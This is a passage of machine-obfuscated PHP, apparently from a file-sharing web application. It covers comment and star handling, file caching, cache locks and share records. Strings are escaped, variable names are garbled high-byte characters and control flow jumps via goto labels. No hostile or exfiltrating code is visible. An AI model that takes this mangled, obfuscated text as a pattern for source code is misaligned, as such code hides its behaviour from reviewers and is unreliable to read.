self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($À§Ç¨•Ñ) { $Ì•–œÂ“ =& $_SERVER[¯µç›È¢]; if ($À§Ç¨•Ñ[$Ì•–œÂ“[1862]]) { $Ú¯¯…³Ä = $this->where(array($Ì•–œÂ“[1863] => $À§Ç¨•Ñ[$Ì•–œÂ“[1862]]))->find(); if (!$Ú¯¯…³Ä || $Ú¯¯…³Ä[$Ì•–œÂ“[417]] != $À§Ç¨•Ñ[$Ì•–œÂ“[417]] || $Ú¯¯…³Ä[$Ì•–œÂ“[510]] != $À§Ç¨•Ñ[$Ì•–œÂ“[510]]) { return !1; } $this->where(array($Ì•–œÂ“[1863] => $À§Ç¨•Ñ[$Ì•–œÂ“[1862]]))->setAdd($Ì•–œÂ“[1864], 1); } $À§Ç¨•Ñ[$Ì•–œÂ“[1865]] = 0; $À§Ç¨•Ñ[$Ì•–œÂ“[1864]] = 0; $À§Ç¨•Ñ[$Ì•–œÂ“[767]] = 1; return $this->add($À§Ç¨•Ñ); } public function commentCount($Ï¹·ö¨®, $®Æı¶Ïı, $‹…ÎØ¤ = false) { $œ¹€Ó¶ =& $_SERVER[¯µç›È¢]; if (!$Ï¹·ö¨®) { return array(); } if (is_string($Ï¹·ö¨®) || is_int($Ï¹·ö¨®)) { $Ï¹·ö¨® = array($Ï¹·ö¨®); } $Á˜íôæ = array($œ¹€Ó¶[510], $œ¹€Ó¶[1866] => $œ¹€Ó¶[505]); $«ç×ô³¢ = array($œ¹€Ó¶[510] => array($œ¹€Ó¶[7], $Ï¹·ö¨®), $œ¹€Ó¶[417] => $®Æı¶Ïı); if ($‹…ÎØ¤) { $«ç×ô³¢[$œ¹€Ó¶[1666]] = $‹…ÎØ¤; } $¶°à÷ÏÓ = $this->field($Á˜íôæ)->where($«ç×ô³¢)->group($œ¹€Ó¶[510])->select(); return array_to_keyvalue($¶°à÷ÏÓ, $œ¹€Ó¶[510], $œ¹€Ó¶[505]); } public function starTarget($±½¦µˆÑ, $ÒÀÅÊÉç) { $º×™ºƒ =& $_SERVER[¯µç›È¢]; $™¢ô“º… = $±½¦µˆÑ + self::TYPE_STAR_OFFSET; $ùºÉ»İº = array($º×™ºƒ[1666] => USER_ID, $º×™ºƒ[417] => $™¢ô“º…, $º×™ºƒ[510] => $ÒÀÅÊÉç); $ı„°»ö = $this->where($ùºÉ»İº)->find(); if ($ı„°»ö) { return $this->where(array($º×™ºƒ[405] => $ı„°»ö[$º×™ºƒ[405]]))->delete(); } $şà™‰™¹ = array($º×™ºƒ[1862] => 0, $º×™ºƒ[1666] => USER_ID, $º×™ºƒ[767] => 1, $º×™ºƒ[772] => $º×™ºƒ[12], $º×™ºƒ[417] => $™¢ô“º…, $º×™ºƒ[510] => $ÒÀÅÊÉç, $º×™ºƒ[1865] => 0, $º×™ºƒ[1864] => 0); return $this->add($şà™‰™¹); } public function starTargetCount($ÑÈÇÎ¬Õ, $®ø§ÔÉ) { $Şúâæ°¶ =& $_SERVER[¯µç›È¢]; $¿˜˜Â†ú = $®ø§ÔÉ + self::TYPE_STAR_OFFSET; $Œ´Œ¬ì£ = $this->commentCount($ÑÈÇÎ¬Õ, $¿˜˜Â†ú); $½±ùËÍê = $this->commentCount($ÑÈÇÎ¬Õ, $¿˜˜Â†ú, USER_ID); return array($Şúâæ°¶[1867] => $Œ´Œ¬ì£, $Şúâæ°¶[1868] => $½±ùËÍê); } public function starTargetUserList($¹Ï¥¼û™, $¦Àä“Ÿ¨) { $’ú³ü¾ğ =& $_SERVER[¯µç›È¢]; $îğÙæÅ² = $¹Ï¥¼û™ + self::TYPE_STAR_OFFSET; $‚î–†ßå = array($’ú³ü¾ğ[510] => $¦Àä“Ÿ¨, $’ú³ü¾ğ[417] => $îğÙæÅ²); $¼ÈÜ‘ı = $this->where($‚î–†ßå)->count(); $¸Æ”¡šè = array($’ú³ü¾ğ[263] => $¼ÈÜ‘ı, $’ú³ü¾ğ[1869] => array()); if (!$¼ÈÜ‘ı) { return $¸Æ”¡šè; } $¬˜õÏö = $this->field($’ú³ü¾ğ[1666])->where($‚î–†ßå)->limit(500)->select(); $¬˜õÏö = array_to_keyvalue($¬˜õÏö, $’ú³ü¾ğ[12], $’ú³ü¾ğ[1666]); $¸Æ”¡šè[$’ú³ü¾ğ[1869]] = Model($’ú³ü¾ğ[518])->userListInfo($¬˜õÏö); return $¸Æ”¡šè; } public function prasiseUserList($ïáö©½å) { $‡ÒÕıŞ =& $_SERVER[¯µç›È¢]; $ôıŞ ãş = array($‡ÒÕıŞ[1870] => $ïáö©½å); $á‡è¶ = $this->where($ôıŞ ãş)->find(); $“Å€îîô = _get($á‡è¶, $‡ÒÕıŞ[1865], 0); $ÅêÍÅ¶ü = array($‡ÒÕıŞ[263] => $“Å€îîô, $‡ÒÕıŞ[1869] => array()); if (!$“Å€îîô) { return $ÅêÍÅ¶ü; } $€ÕßËÁª = Model($‡ÒÕıŞ[1871])->field($‡ÒÕıŞ[1666])->where($ôıŞ ãş)->limit(500)->select(); $€ÕßËÁª = array_to_keyvalue($€ÕßËÁª, $‡ÒÕıŞ[12], $‡ÒÕıŞ[1666]); $ÅêÍÅ¶ü[$‡ÒÕıŞ[1869]] = Model($‡ÒÕıŞ[518])->userListInfo($€ÕßËÁª); return $ÅêÍÅ¶ü; } public function remove($ÅŸèŠ·è) { $…áñùî =& $_SERVER[¯µç›È¢]; $“¢º¿óñ = array($…áñùî[1863] => $ÅŸèŠ·è); $à‡Õ–Õ = $this->where($“¢º¿óñ)->find(); if ($à‡Õ–Õ[$…áñùî[1862]]) { $this->where(array($…áñùî[1863] => $à‡Õ–Õ[$…áñùî[1862]]))->setAdd($…áñùî[1864], -1); } return $this->where($“¢º¿óñ)->delete(); } public function edit($É¾ÓÃ˜ô, $Ã§ëê) { $ëÙì„â =& $_SERVER[¯µç›È¢]; $±†ËÂ¯½ = array($ëÙì„â[1863] => $É¾ÓÃ˜ô); return $this->where($±†ËÂ¯½)->save(array($ëÙì„â[1872] => $Ã§ëê)); } public function prasise($ˆ«Û©ö‰) { $¤ÔÈ‹íŸ =& $_SERVER[¯µç›È¢]; $í˜¿„Ç = Model($¤ÔÈ‹íŸ[1873]); $·÷ç‰¶É = array($¤ÔÈ‹íŸ[1863] => $ˆ«Û©ö‰, $¤ÔÈ‹íŸ[1657] => USER_ID); $¾ò£à»¿ = $í˜¿„Ç->where($·÷ç‰¶É)->find(); if (!$¾ò£à»¿) { $í˜¿„Ç->add($·÷ç‰¶É); $ÒÅ¿Óà¬ = $this->where(array($¤ÔÈ‹íŸ[1863] => $ˆ«Û©ö‰))->setAdd($¤ÔÈ‹íŸ[1865], 1); } else { $í˜¿„Ç->where($·÷ç‰¶É)->delete(); $ÒÅ¿Óà¬ = $this->where(array($¤ÔÈ‹íŸ[1863] => $ˆ«Û©ö‰))->setAdd($¤ÔÈ‹íŸ[1865], -1); } return $ÒÅ¿Óà¬; } public function targetInfo($Á×¯Áº¸, $àã©àĞÀ) { $¢ú‚¢ =& $_SERVER[¯µç›È¢]; $„—å×÷ = array($¢ú‚¢[588] => $Á×¯Áº¸, $¢ú‚¢[589] => $àã©àĞÀ); $ŠÄ×òÃ´ = $this->where($„—å×÷)->count(); $ê×˜ûÅµ = "\x52\x49\107\x48\x54\40\x4a\117\111\116\40{$this->tablePrefix}\x63\157\155\155\x65\156\x74\x5f\x70\x72\x61\151\x73\x65\40\163\164\141\162\40\x6f\x6e\x20\x63\x6f\155\x6d\x65\156\x74\x2e\x63\x6f\x6d\x6d\145\156\x74\111\104\x20\75\40\x73\x74\141\x72\x2e\x63\157\x6d\x6d\145\x6e\x74\x49\104"; $‡÷Ôì„ = $this->alias($¢ú‚¢[362])->where($„—å×÷)->join($ê×˜ûÅµ, $¢ú‚¢[1874])->count(); $¿É”û½ = array($¢ú‚¢[1875] => $ŠÄ×òÃ´, $¢ú‚¢[1876] => $‡÷Ôì„); return $¿É”û½; } public function listData($Ç½ÏŸ†’) { $ğÙ®æÙ =& $_SERVER[¯µç›È¢]; if (isset($Ç½ÏŸ†’[$ğÙ®æÙ[1877]])) { if ($Ç½ÏŸ†’[$ğÙ®æÙ[1877]]) { $Ç½ÏŸ†’[$ğÙ®æÙ[1870]] = array($ğÙ®æÙ[1026], intval($Ç½ÏŸ†’[$ğÙ®æÙ[1877]])); } unset($Ç½ÏŸ†’[$ğÙ®æÙ[1877]]); } if (isset($Ç½ÏŸ†’[$ğÙ®æÙ[1878]])) { if ($Ç½ÏŸ†’[$ğÙ®æÙ[1878]]) { $Ç½ÏŸ†’[$ğÙ®æÙ[1870]] = array($ğÙ®æÙ[1023], intval($Ç½ÏŸ†’[$ğÙ®æÙ[1878]])); } unset($Ç½ÏŸ†’[$ğÙ®æÙ[1878]]); } return $this->_listData($Ç½ÏŸ†’); } private function _listData($…¾ü¡Ş) { $ØÖë×ü =& $_SERVER[¯µç›È¢]; $œÄıË¯Ş = $this->where($…¾ü¡Ş)->_makeOrder()->selectPage(100); $this->_listAppendParent($œÄıË¯Ş[$ØÖë×ü[377]]); $this->_listAppendUser($œÄıË¯Ş[$ØÖë×ü[377]]); $this->_listAppendMeta($œÄıË¯Ş[$ØÖë×ü[377]]); return $œÄıË¯Ş; } private function _makeOrder() { $ë¹œåÏØ =& $_SERVER[¯µç›È¢]; $ú“Û‚Ô” = array($ë¹œåÏØ[1865], $ë¹œåÏØ[1864], $ë¹œåÏØ[207]); $Ÿˆš€‹­ = Input::get($ë¹œåÏØ[460], $ë¹œåÏØ[7], $ë¹œåÏØ[429], $ú“Û‚Ô”); $¹•¥™ëè = Input::get($ë¹œåÏØ[461], $ë¹œåÏØ[7], $ë¹œåÏØ[1659], array($ë¹œåÏØ[1879], $ë¹œåÏØ[456])); $¿ãŒè Î = $Ÿˆš€‹­ . $ë¹œåÏØ[53] . $¹•¥™ëè; return $this->order($¿ãŒè Î); } private function _listAppendParent(&$í»²©ñ) { $„òÍœìˆ =& $_SERVER[¯µç›È¢]; $µçõßãŸ = array_unique(array_to_keyvalue($í»²©ñ, $„òÍœìˆ[12], $„òÍœìˆ[1862])); $µçõßãŸ = array_remove_value($µçõßãŸ, $„òÍœìˆ[204]); if (!$µçõßãŸ) { return; } $ƒ›Ô¸Æ = $this->where(array($„òÍœìˆ[1863] => array($„òÍœìˆ[7], $µçõßãŸ)))->select(); $ƒ›Ô¸Æ = array_to_keyvalue($ƒ›Ô¸Æ, $„òÍœìˆ[1870]); foreach ($í»²©ñ as &$Œ¼îíÒ‘) { if (isset($ƒ›Ô¸Æ[$Œ¼îíÒ‘[$„òÍœìˆ[1862]]])) { $Œ¼îíÒ‘[$„òÍœìˆ[1880]] = $ƒ›Ô¸Æ[$Œ¼îíÒ‘[$„òÍœìˆ[1862]]]; } } unset($Œ¼îíÒ‘); } private function _listAppendUser(&$˜ö¬ûà¸) { $Ô×û‰¬ƒ =& $_SERVER[¯µç›È¢]; $¶Ó‰ûß = array_unique(array_to_keyvalue($˜ö¬ûà¸, $Ô×û‰¬ƒ[12], $Ô×û‰¬ƒ[1666])); $¶Ó‰ûß = array_remove_value($¶Ó‰ûß, $Ô×û‰¬ƒ[204]); if (count($¶Ó‰ûß) == 0) { return; } foreach ($˜ö¬ûà¸ as $Ş¤¥ ‰) { if (isset($Ş¤¥ ‰[$Ô×û‰¬ƒ[1880]])) { $¶Ó‰ûß[] = $Ş¤¥ ‰[$Ô×û‰¬ƒ[1880]][$Ô×û‰¬ƒ[1666]]; } } $ã«˜ĞĞá = Model($Ô×û‰¬ƒ[546])->userListInfo($¶Ó‰ûß); foreach ($˜ö¬ûà¸ as &$Ş¤¥ ‰) { $Ş¤¥ ‰[$Ô×û‰¬ƒ[602]] = $ã«˜ĞĞá[$Ş¤¥ ‰[$Ô×û‰¬ƒ[1666]]]; if (isset($Ş¤¥ ‰[$Ô×û‰¬ƒ[1880]])) { $Ş¤¥ ‰[$Ô×û‰¬ƒ[1880]][$Ô×û‰¬ƒ[602]] = $ã«˜ĞĞá[$Ş¤¥ ‰[$Ô×û‰¬ƒ[1880]][$Ô×û‰¬ƒ[1666]]]; } } unset($Ş¤¥ ‰); } private function _listAppendMeta(&$·õ‰æ¾ğ) { $ÅÄÕÊÁ¤ =& $_SERVER[¯µç›È¢]; $ÇÆç£ = array_unique(array_to_keyvalue($·õ‰æ¾ğ, $ÅÄÕÊÁ¤[12], $ÅÄÕÊÁ¤[1870])); $ÇÆç£ = array_remove_value($ÇÆç£, $ÅÄÕÊÁ¤[204]); if (!$ÇÆç£) { return; } foreach ($·õ‰æ¾ğ as $ò™½êÛ÷) { if (isset($ò™½êÛ÷[$ÅÄÕÊÁ¤[1880]])) { $ÇÆç£[] = $ò™½êÛ÷[$ÅÄÕÊÁ¤[1880]][$ÅÄÕÊÁ¤[1870]]; } } $ÑÇ¦ú§ = $this->metaList($ÇÆç£); if (!$ÑÇ¦ú§) { return !1; } foreach ($·õ‰æ¾ğ as &$ò™½êÛ÷) { $ò™½êÛ÷[$ÅÄÕÊÁ¤[470]] = $ÑÇ¦ú§[$ò™½êÛ÷[$ÅÄÕÊÁ¤[1870]]]; if (isset($ò™½êÛ÷[$ÅÄÕÊÁ¤[1880]])) { $ò™½êÛ÷[$ÅÄÕÊÁ¤[1880]][$ÅÄÕÊÁ¤[470]] = $ÑÇ¦ú§[$ò™½êÛ÷[$ÅÄÕÊÁ¤[1880]][$ÅÄÕÊÁ¤[1870]]]; } } unset($ò™½êÛ÷); } private function metaList($ı—§Á¹ó) { $ì³²Û¥ =& $_SERVER[¯µç›È¢]; if (!$ı—§Á¹ó) { return array(); } $Ş×¬ÀÀ = array($ì³²Û¥[1870] => array($ì³²Û¥[7], $ı—§Á¹ó)); $‰±°Î¾ü = Model($ì³²Û¥[1881])->where($Ş×¬ÀÀ)->select(); $‰±°Î¾ü = array_to_keyvalue_group($‰±°Î¾ü, $ì³²Û¥[1870]); foreach ($‰±°Î¾ü as $§Ï¾÷ÏÀ => $Ã‡üµ¤ş) { $úœÌÊ—– = array(); foreach ($Ã‡üµ¤ş as $„®ï€áá) { $úœÌÊ—–[$„®ï€áá[$ì³²Û¥[105]]] = $„®ï€áá[$ì³²Û¥[382]]; } $‰±°Î¾ü[$§Ï¾÷ÏÀ] = $úœÌÊ—–; } return $‰±°Î¾ü ? $‰±°Î¾ü : array(); } } class FileContentModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x66\151\x6c\145\137\143\157\156\x74\x65\x6e\x74\x73"; protected $dataAuto = array(array("\x63\162\x65\141\164\x65\x54\x69\155\x65", "\164\x69\x6d\145", "\x69\x6e\x73\145\162\x74", "\146\165\x6e\x63\164\151\157\x6e")); } goto eñÛ”›†ôÊ; B¡ë„ŒÁ§: class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($¨®ñ³Œ², $‰•ã†×) { $º¯£’ãû =& $_SERVER[¯µç›È¢]; $this->cachePath = $¨®ñ³Œ²[$º¯£’ãû[88]]; $this->prefix = $º¯£’ãû[851]; $this->cacheTime = $‰•ã†×; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($©åâÙ·°) { $õ¦ƒ“åŠ =& $_SERVER[¯µç›È¢]; $©åâÙ·° = str_replace(array($õ¦ƒ“åŠ[852], $õ¦ƒ“åŠ[108], $õ¦ƒ“åŠ[83]), $õ¦ƒ“åŠ[853], $©åâÙ·°); return $this->cachePath . $õ¦ƒ“åŠ[854] . $©åâÙ·° . $õ¦ƒ“åŠ[855]; } public function set($±õÔ§Ã¶, $‘ªïã¯Ÿ, $êîÑÛ¹Ï = false) { $ù´Ëóàî = $this->getFile($±õÔ§Ã¶); if (file_put_contents($ù´Ëóàî, $this->prefix . $‘ªïã¯Ÿ, LOCK_EX)) { @touch($ù´Ëóàî, intval(time() + $êîÑÛ¹Ï)); clearstatcache(); return !0; } @unlink($ù´Ëóàî); return !1; } public function get($Õ’×óÎÑ) { $îÁø¥Ü± = $this->getFile($Õ’×óÎÑ); if (file_exists($îÁø¥Ü±) && filemtime($îÁø¥Ü±) < time()) { @unlink($îÁø¥Ü±); return !1; } $éŸôİ¼Ò = @file_get_contents($îÁø¥Ü±); return substr($éŸôİ¼Ò, strlen($this->prefix)); } public function remove($ü”ÉÁÚÛ) { $ı°šµÔ = $this->getFile($ü”ÉÁÚÛ); return @unlink($ı°šµÔ); } public function deleteAll() { $İö©³² =& $_SERVER[¯µç›È¢]; $ğ¢Ëä‰¦ = scandir($this->cachePath); foreach ($ğ¢Ëä‰¦ as $ûÀÑøœœ) { $ÒÊğØ¥® = $this->cachePath . $ûÀÑøœœ; if (strpos($ÒÊğØ¥®, $İö©³²[855]) && strpos($ÒÊğØ¥®, $İö©³²[856])) { @unlink($ÒÊğØ¥®); } } } public function clearTimeout() { $Ê©‡ìğ =& $_SERVER[¯µç›È¢]; $æõ€Î¡â = scandir($this->cachePath); foreach ($æõ€Î¡â as $™àüæîğ) { $…Şà¾Ë¼ = $this->cachePath . $™àüæîğ; if (strpos($…Şà¾Ë¼, $Ê©‡ìğ[855]) && strpos($…Şà¾Ë¼, $Ê©‡ìğ[856]) && filemtime($…Şà¾Ë¼) < time()) { @unlink($…Şà¾Ë¼); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $±¡’æ®¡ =& $_SERVER[¯µç›È¢]; if (self::$handle) { return self::$handle; } $ËÜ…ªæ¿ = $GLOBALS[$±¡’æ®¡[6]][$±¡’æ®¡[357]]; self::$timeout = $ËÜ…ªæ¿[$±¡’æ®¡[857]] ? $ËÜ…ªæ¿[$±¡’æ®¡[857]] : 10; $‰ä’†à = _get($GLOBALS[$±¡’æ®¡[6]], $±¡’æ®¡[858]); $×ä¥…ÖÙ = $ËÜ…ªæ¿[$±¡’æ®¡[844]] ? $ËÜ…ªæ¿[$±¡’æ®¡[844]] : $±¡’æ®¡[206]; if ($×ä¥…ÖÙ == $±¡’æ®¡[21] && $‰ä’†à == $±¡’æ®¡[13]) { $×ä¥…ÖÙ = $±¡’æ®¡[206]; } switch ($×ä¥…ÖÙ) { case $±¡’æ®¡[847]: self::$handle = new CacheLockRedis(); break; case $±¡’æ®¡[848]: self::$handle = new CacheLockMemcached(); break; case $±¡’æ®¡[21]: self::$handle = new CacheLockDatabase(); break; case $±¡’æ®¡[206]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($±¡’æ®¡[859], $±¡’æ®¡[860]); } return self::$handle; } private static function key($Ô¤ŒŒ–) { return $_SERVER[¯µç›È¢][861] . Cache::key($Ô¤ŒŒ–); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($Å§øª˜ç = '') { self::$errorMsg = $Å§øª˜ç; } public static function lockGlobal($—Ş×°í¦, $Îááîˆ) { return self::lock($—Ş×°í¦, $Îááîˆ, !0); } public static function lock($§¶—•ÌÙ, $ˆ›ç´§‹ = false, $¹öñ¢ˆî = false) { $ÛçÒâ— =& $_SERVER[¯µç›È¢]; $´Ô‡éÈª = self::init(); $¬°ÓúŒı = self::key($§¶—•ÌÙ); $ˆ›ç´§‹ = $ˆ›ç´§‹ ? $ˆ›ç´§‹ : self::$timeout; $‚Ô¾œÏÔ = $´Ô‡éÈª->lock($¬°ÓúŒı, $ˆ›ç´§‹); $á‚†Øñ = timeFloat(); if (!$‚Ô¾œÏÔ) { $ÁÜ®Ò€ = "\x6c\157\x63\x6b\40\145\x72\x72\157\162\73\153\145\171\75{$§¶—•ÌÙ}\73\x74\x69\155\145\x3d{$ˆ›ç´§‹}\x3b" . self::$errorMsg . $ÛçÒâ—[81] . get_caller_msg(); $ÎıÎé”– = LNG($ÛçÒâ—[862]) . "\50{$ˆ›ç´§‹}\163\x29\x2e" . LNG($ÛçÒâ—[863]); $ÎıÎé”– .= $ÛçÒâ—[864]; if (is_string(self::$errorMsg) && self::$errorMsg) { $ÎıÎé”– = $ÎıÎé”– . $ÛçÒâ—[865] . self::$errorMsg; } write_log($ÁÜ®Ò€, $ÛçÒâ—[860]); show_json($ÎıÎé”–, !1); } if (!$¹öñ¢ˆî) { self::$lockItem[$¬°ÓúŒı] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $Ì² ì = number_format(timeFloat() - $á‚†Øñ, 3); write_log($ÛçÒâ—[866] . $§¶—•ÌÙ . $ÛçÒâ—[867] . $Ì² ì, $ÛçÒâ—[860]); } return $‚Ô¾œÏÔ; } public static function lockGet($®èíµ˜) { $·±¾ïµ = self::key($®èíµ˜); if (self::$lockItem[$·±¾ïµ]) { return self::$lockItem[$·±¾ïµ]; } return self::init()->lockGet($·±¾ïµ); } public static function unlock($ŠìËö¡Ä) { $Š·¬â‹ =& $_SERVER[¯µç›È¢]; $¹óƒ‚şô = self::key($ŠìËö¡Ä); self::$lockItem[$¹óƒ‚şô] = null; self::init()->unlock($¹óƒ‚şô); if (GLOBAL_DEBUG_LOG_ALL) { write_log($Š·¬â‹[868] . $ŠìËö¡Ä, $Š·¬â‹[860]); } return; } public static function unlockRuntime() { $äÈ©¶» =& $_SERVER[¯µç›È¢]; $‘ÉóğÜÊ = self::init(); $Î¡¤« = !1; foreach (self::$lockItem as $ôºŞĞšÌ => $öëøñõŸ) { if (!$öëøñõŸ) { continue; } $‘ÉóğÜÊ->unlock($ôºŞĞšÌ); if (!$Î¡¤«) { $Î¡¤« = !0; write_log($äÈ©¶»[869] . $ôºŞĞšÌ . $äÈ©¶»[81] . get_caller_msg(), $äÈ©¶»[860]); continue; } write_log($äÈ©¶»[869] . $ôºŞĞšÌ, $äÈ©¶»[860]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $«»ĞÑáÄ = number_format(timeFloat() - TIME_FLOAT, 3); write_log($äÈ©¶»[870] . $«»ĞÑáÄ . $äÈ©¶»[871] . ACTION, $äÈ©¶»[860]); } } public static function fileLock($Ô„Ì”íï) { $¾¼ĞĞ¢Ú =& $_SERVER[¯µç›È¢]; if (!$GLOBALS[$¾¼ĞĞ¢Ú[872]]) { $GLOBALS[$¾¼ĞĞ¢Ú[872]] = array(); } $GLOBALS[$¾¼ĞĞ¢Ú[872]][$Ô„Ì”íï] = !1; $¬®«µ«ì = fopen(DATA_PATH . $Ô„Ì”íï . $¾¼ĞĞ¢Ú[873], $¾¼ĞĞ¢Ú[874]); if (!$¬®«µ«ì) { return !1; } $GLOBALS[$¾¼ĞĞ¢Ú[872]][$Ô„Ì”íï] = $¬®«µ«ì; if (flock($¬®«µ«ì, LOCK_EX)) { return !0; } self::unlock($Ô„Ì”íï); show_json($¾¼ĞĞ¢Ú[875], !1); return !1; } public static function fileUnlock($Ö¸°œûŒ) { $¶ˆƒÉê =& $_SERVER[¯µç›È¢]; $ïÒÄñ = $GLOBALS[$¶ˆƒÉê[872]][$Ö¸°œûŒ]; if (!$ïÒÄñ) { return; } $GLOBALS[$¶ˆƒÉê[872]][$Ö¸°œûŒ] = !1; flock($ïÒÄñ, LOCK_UN); fclose($ïÒÄñ); } public static function fileUnlockAll() { $åœ¯Ñ©¡ =& $_SERVER[¯µç›È¢]; if (!$GLOBALS[$åœ¯Ñ©¡[872]]) { return; } foreach ($GLOBALS[$åœ¯Ñ©¡[872]] as $¡ªøßº• => $‘¦éôâ§) { if (!$‘¦éôâ§) { continue; } $GLOBALS[$åœ¯Ñ©¡[872]][$¡ªøßº•] = !1; flock($‘¦éôâ§, LOCK_UN); fclose($‘¦éôâ§); } $GLOBALS[$åœ¯Ñ©¡[872]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } goto b”éô®; fº®¹ŒÓ†å: class ShareModel extends ModelBase { protected $tableName = "\x73\x68\141\162\x65"; protected $dataAuto = array(array("\155\x6f\x64\151\146\171\124\x69\x6d\145", "\164\x69\155\x65", "\x69\156\163\145\x72\164\54\165\x70\144\x61\164\x65", "\146\x75\156\143\164\x69\157\x6e"), array("\x63\162\x65\x61\x74\145\x54\151\155\145", "\164\151\155\145", "\x69\156\163\145\x72\164", "\x66\x75\x6e\143\164\x69\x6f\x6e"), array("\x6f\160\x74\x69\x6f\156\x73", '', "\151\x6e\163\145\x72\164\54\x75\x70\144\x61\x74\x65\x2c\x73\145\154\x65\x63\164", "\152\x73\157\x6e")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($„üå†÷Ñ) { $„øÕ¨Ì… =& $_SERVER[¯µç›È¢]; $·ŞİÍšÄ = isset($„üå†÷Ñ[0]) ? $„üå†÷Ñ[0] : !1; return array($„øÕ¨Ì…[1970] => array(USER_ID, $„øÕ¨Ì…[1971]), $„øÕ¨Ì…[1913] => array($·ŞİÍšÄ, $„øÕ¨Ì…[1972])); } protected function listSimple() { $–Ğ±Í® = array($_SERVER[¯µç›È¢][1666] => USER_ID); $ïüşÉóÅ = $this->field($this->fieldList)->where($–Ğ±Í®)->select(); return $ïüşÉóÅ ? $ïüşÉóÅ : array(); } protected function getInfo($öß†İğİ, $Ú†ÜÎàã = false) { $ÚÒØÕ¤ç =& $_SERVER[¯µç›È¢]; if ($Ú†ÜÎàã) { return $this->_getShareInfo(array($ÚÒØÕ¤ç[493] => $öß†İğİ)); } $ù‘±›’ = $this->cacheFunctionGet($ÚÒØÕ¤ç[1915], $öß†İğİ); return $ù‘±›’; } public function getInfoByHash($ÑÅ¬¸Ó­) { return $this->_getShareInfo(array($_SERVER[¯µç›È¢][495] => $ÑÅ¬¸Ó­)); } public function getInfoByPath($Ö÷¹ä¢—) { $õßÓ¢şª =& $_SERVER[¯µç›È¢]; $²¢Û¢ÛË = array($õßÓ¢şª[1666] => USER_ID, $õßÓ¢şª[408] => $Ö÷¹ä¢—); return $this->_getShareInfo($²¢Û¢ÛË); } public function getInfoBySourcePath($Ğíñ‹§) { $ºà–õü½ =& $_SERVER[¯µç›È¢]; $—üÜÍ–˜ = array($ºà–õü½[1666] => USER_ID, $ºà–õü½[1186] => $Ğíñ‹§); return $this->_getShareInfo($—üÜÍ–˜); } private function _getShareInfo($øÑÍ‚ï§) { $Ú¬¦‚õÑ =& $_SERVER[¯µç›È¢]; $Ôî¬Í¬á = $this->where($øÑÍ‚ï§)->find(); if (!$Ôî¬Í¬á) { return !1; } $øÑÍ‚ï§ = array($Ú¬¦‚õÑ[493] => $Ôî¬Í¬á[$Ú¬¦‚õÑ[493]]); $Êß‰Öş = $Ú¬¦‚õÑ[1973]; $Íˆ¢ã„ê = Model($Ú¬¦‚õÑ[604])->order($Ú¬¦‚õÑ[405])->field($Êß‰Öş)->where($øÑÍ‚ï§)->select(); if ($Ôî¬Í¬á[$Ú¬¦‚õÑ[408]] == $Ú¬¦‚õÑ[204]) { $Ôî¬Í¬á[$Ú¬¦‚õÑ[97]] = IO::info($Ôî¬Í¬á[$Ú¬¦‚õÑ[1186]]); } else { $Ôî¬Í¬á[$Ú¬¦‚õÑ[97]] = Model($Ú¬¦‚õÑ[1337])->pathInfo($Ôî¬Í¬á[$Ú¬¦‚õÑ[408]]); } $Ôî¬Í¬á[$Ú¬¦‚õÑ[1974]] = $Íˆ¢ã„ê; return $Ôî¬Í¬á; } protected function getInfoAuth($¥›¬¸–Ÿ) { $æ”öÔ™à =& $_SERVER[¯µç›È¢]; $ìÃêŸ‹ë = $this->getInfo($¥›¬¸–Ÿ); if ($ìÃêŸ‹ë[$æ”öÔ™à[1666]] == USER_ID) { $ìÃêŸ‹ë[$æ”öÔ™à[419]] = $ìÃêŸ‹ë[$æ”öÔ™à[97]][$æ”öÔ™à[419]]; } else { $ìÃêŸ‹ë[$æ”öÔ™à[419]] = Model($æ”öÔ™à[507])->authMake($ìÃêŸ‹ë[$æ”öÔ™à[1974]]); } return $ìÃêŸ‹ë; } protected function listData($ƒïÔàèÀ = null, $°“àğ‰¼ = 300) { $¶° „óã =& $_SERVER[¯µç›È¢]; $ıØè•¶¶ = array(array($¶° „óã[498] => array($¶° „óã[1024], 0), $¶° „óã[500] => array($¶° „óã[1024], 0), $¶° „óã[1975] => $¶° „óã[1931])); if ($ƒïÔàèÀ == $¶° „óã[1976]) { $ıØè•¶¶ = array($¶° „óã[498] => 1); } else { if ($ƒïÔàèÀ == $¶° „óã[1171]) { $ıØè•¶¶ = array($¶° „óã[500] => 1); } } $ıØè•¶¶[$¶° „óã[1666]] = USER_ID; $ÈŸïÙ±Ú = $this->where($ıØè•¶¶)->selectPage($°“àğ‰¼); return $ÈŸïÙ±Ú; } protected function listToMe($®ÕÔ‰› = 300) { $µ›ÔÕÕ· =& $_SERVER[¯µç›È¢]; $¾§…¹ = Model($µ›ÔÕÕ·[1977])->userGroupParents(USER_ID); $€€ˆÆåå = array($µ›ÔÕÕ·[588] => SourceModel::TYPE_USER, $µ›ÔÕÕ·[510] => USER_ID); if ($¾§…¹) { $€€ˆÆåå = array(array($µ›ÔÕÕ·[588] => SourceModel::TYPE_USER, $µ›ÔÕÕ·[510] => USER_ID), array($µ›ÔÕÕ·[588] => SourceModel::TYPE_GROUP, $µ›ÔÕÕ·[510] => array($µ›ÔÕÕ·[7], $¾§…¹)), $µ›ÔÕÕ·[1975] => $µ›ÔÕÕ·[1931]); } $íÄâ²¯ = Model($µ›ÔÕÕ·[604])->where($€€ˆÆåå)->selectPage($®ÕÔ‰›); $ã„ô²¤Ô = array_to_keyvalue_group($íÄâ²¯[$µ›ÔÕÕ·[377]], $µ›ÔÕÕ·[493]); if (!$ã„ô²¤Ô) { return $íÄâ²¯; } $†È‚í§Ö = $µ›ÔÕÕ·[1978]; $€€ˆÆåå = array($µ›ÔÕÕ·[493] => array($µ›ÔÕÕ·[424], array_keys($ã„ô²¤Ô)), 